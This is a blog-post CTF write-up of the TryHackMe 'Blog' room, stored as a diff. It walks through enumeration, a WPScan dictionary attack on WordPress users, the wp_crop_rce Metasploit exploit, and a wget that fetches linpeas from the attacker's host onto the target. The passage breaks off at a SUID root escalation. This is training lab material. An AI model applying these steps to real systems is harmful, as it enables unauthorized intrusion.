@@ -1,0 +1,111 @@
+I"V<p><img src="" alt="wordpress-logo" /></p>
+
+<p>Hello Guys!</p>
+
+<p>In this Post we will discuss the Blog CTF on TryHackMe.
+At this point its a new Room (5 Days old).
+In order to get the blog to work with AWS, you’ll need to add blog.thm 
+to your /etc/hosts file.</p>
+
+<p>URL: <a href="https://tryhackme.com/room/blog">Blog</a></p>
+
+<p>Difficulty: Medium</p>
+
+<p>Author: <a href="https://tryhackme.com/p/Nameless0ne">Nameless0ne</a></p>
+
+<p>As always, I started by Enumerating the System.</p>
+
+<p>Nmap gor me the following Results:</p>
+
+<p><img src="https://cdn.discordapp.com/attachments/723180241140318278/733283213937606666/unknown.png" alt="nmap" /></p>
+
+<p>Afterwards I ran enum4linux and Gobuster with the popular common.txt Wordlist.</p>
+
+<p><img src="https://cdn.discordapp.com/attachments/723180241140318278/733284680522137750/unknown.png" alt="gobuster" />
+<img src="https://cdn.discordapp.com/attachments/723180241140318278/733284876538740777/unknown.png" alt="enum4linux" />
+<img src="https://cdn.discordapp.com/attachments/723180241140318278/733285029433835520/unknown.png" alt="enum4linux-nbt" /></p>
+
+<p>In the Actual Site, we can also see two Names which we could use to Bruteforce a Password:</p>
+
+<p><img src="https://cdn.discordapp.com/attachments/723180241140318278/733289155953688636/unknown.png" alt="names" /></p>
+
+<p>I used all Usernames I got up until that point, and made a custom Username-List. I simply changed the formats
+from Names to usernames, for example:</p>
+
+<p><code class="language-plaintext highlighter-rouge">bob johnson -&gt; bob.johnson -&gt; johnson.bob -&gt; bob-johnson -&gt; bob-johnson123 ...</code></p>
+
+<p>Thats what you could do on another Site. Since we got a Wordpress Site, we can use a Tool called <strong>wpsscan</strong> to 
+Enumerate Users and Dictionary Attack their Password with rockyou.txt.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[i] User(s) Identified:
+
+[+] kwheel
+ | Found By: Author Posts - Author Pattern (Passive Detection)
+ | Confirmed By:
+ |  Wp Json Api (Aggressive Detection)
+ |   - http://blog.thm/wp-json/wp/v2/users/?per_page=100&amp;page=1
+ |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ |  Login Error Messages (Aggressive Detection)
+
+[+] bjoel
+ | Found By: Author Posts - Author Pattern (Passive Detection)
+ | Confirmed By:
+ |  Wp Json Api (Aggressive Detection)
+ |   - http://blog.thm/wp-json/wp/v2/users/?per_page=100&amp;page=1
+ |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ |  Login Error Messages (Aggressive Detection)
+</code></pre></div></div>
+
+<p>As I said before, from here you can use the Tool with the two found Usernames to Dicitonary attack the</p>
+
+<p>two Users.</p>
+
+<p><img src="https://cdn.discordapp.com/attachments/723180241140318278/733316945226760292/unknown.png" alt="attackingusers" /></p>
+
+<p>After getting the Password for one of the Users, you will get Access to the Panel. You have no rights</p>
+
+<p>to actually Post anything. We need to PrivEsc.</p>
+
+<p><img src="https://cdn.discordapp.com/attachments/723180241140318278/733317602692300830/unknown.png" alt="panel" /></p>
+
+<p>Since this is a outdated WordPress Version, I found a <a href="https://www.exploit-db.com/exploits/46662">Exploit</a> for it.</p>
+
+<p>It has its own Metasploit Module in <strong>exploit/multi/http/wp_crop_rce</strong>. As the Name says, its a RCE Exploit.</p>
+
+<p><img src="https://cdn.discordapp.com/attachments/723180241140318278/733319786632708184/unknown.png" alt="msfmodul" />
+<img src="https://cdn.discordapp.com/attachments/723180241140318278/733320446182817832/unknown.png" alt="meterpreter" /></p>
+
+<p>As we can see, we gained a Meterpreter Session. We are currently <strong>www-data</strong>. We have to PrivEsc again.</p>
+
+<p><img src="https://cdn.discordapp.com/attachments/723180241140318278/733322172495298590/unknown.png" alt="www-data" /></p>
+
+<p>I opened a Shell to navigate faster. I had to spawn the Bash Shell with the following Command:</p>
+
+<p><code class="language-plaintext highlighter-rouge">python -c 'import pty; pty.spawn("/bin/bash")'</code></p>
+
+<p><img src="https://cdn.discordapp.com/attachments/723180241140318278/733323150846066768/unknown.png" alt="shelldrop" /></p>
+
+<p>The actual User Flag in /home/bjoe1 turns out to be a Fake User Flag.</p>
+
+<p>In order to PrivEsc the right way, I uploaded linpeas onto the System. I created a Python Web Server</p>
+
+<p>on my local Machine with the Command <code class="language-plaintext highlighter-rouge">python3 -m http.server [PORT]</code>. The Webserver needs to be initialized
+in the Folder, the File(s) you want to Download are stored. Afterwards I ran the Command
+<code class="language-plaintext highlighter-rouge">wget http://{IP}:{PORT}/linpeas.sh</code> to Download the File. Make sure to be in a Direvtory where you are
+able to Execute, /tmp is always a good one. Dont forget to give the File execute Perms.</p>
+
+<p><img src="https://cdn.discordapp.com/attachments/723180241140318278/733328427846992012/unknown.png" alt="linpease" /></p>
+
+<p>Linpease gave us the following SUID PriEsc Methods:</p>
+
+<p><img src="https://cdn.discordapp.com/attachments/723180241140318278/733333551696707656/unknown.png" alt="privesclin" /></p>
+
+<p>I additionally ran the following Command:</p>
+
+<p><code class="language-plaintext highlighter-rouge">find -perm -400 -ls 2&gt;/dev/null</code></p>
+
+<p><img src="https://cdn.discordapp.com/attachments/723180241140318278/733340159277531196/unknown.png" alt="dev" /></p>
+
+<p>So as we can see, there is a weird “checker” Programm. After some basic Reverse Engeneering, I saw that I could
+get Admin (UID 0)</p>
+:ET
